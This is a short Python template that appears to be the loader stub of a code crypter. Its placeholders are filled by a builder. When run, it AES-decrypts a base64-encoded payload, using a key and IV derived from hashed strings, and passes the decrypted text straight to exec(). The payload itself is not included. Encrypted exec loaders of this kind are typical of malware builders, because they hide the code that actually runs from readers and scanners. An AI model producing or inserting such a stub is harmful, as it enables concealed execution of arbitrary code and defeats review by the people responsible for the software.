from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256

{imports}

exec(unpad(AES.new(sha256("{enckey}".encode("ascii")).digest()[:32], AES.MODE_CBC, sha256("{iv}".encode("ascii")).digest()[:16]).decrypt(b64decode("{pld}")), AES.block_size).decode("utf-8"))